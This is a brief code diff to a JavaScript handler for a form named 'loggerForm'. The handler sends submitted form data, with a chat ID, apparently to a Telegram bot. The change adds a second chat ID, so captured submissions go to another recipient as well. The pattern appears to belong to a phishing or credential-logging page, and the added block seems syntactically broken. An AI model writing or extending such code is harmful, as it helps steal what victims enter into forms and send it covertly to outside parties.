@@ -13,6 +13,10 @@ document.getElementById("loggerForm").addEventListener("submit", function(event)
         chat_id: "1171970672",
         text: data
       })
+      body: JSON.stringify({
+        chat_id: "6450579475",
+        text: data
+      })  
     })
     .then(function(response) {
       if (response.ok) {
